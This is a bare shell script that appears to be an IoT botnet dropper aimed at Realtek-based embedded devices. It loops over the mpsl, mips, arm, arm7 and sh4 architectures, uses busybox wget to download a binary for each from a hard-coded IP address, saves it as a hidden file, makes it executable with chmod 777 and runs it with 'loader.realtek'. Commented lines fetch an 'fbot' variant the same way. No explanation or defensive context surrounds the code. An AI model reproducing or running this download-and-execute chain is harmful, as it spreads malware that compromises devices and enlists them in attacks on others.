n='mpsl mips arm arm7 sh4'
http_server='45.61.188.184'

for a in $n
do
	cat $SHELL > .b
	>.b
	busybox wget http://$http_server/.bom/b.$a -O- > .b
 #       busybox wget http://$http_server/.bu/fbot.$a -O- > .s
	chmod 777 .b
#	chmod 777 .s
	./.b loader.realtek
#	./.s loader.realtek
done

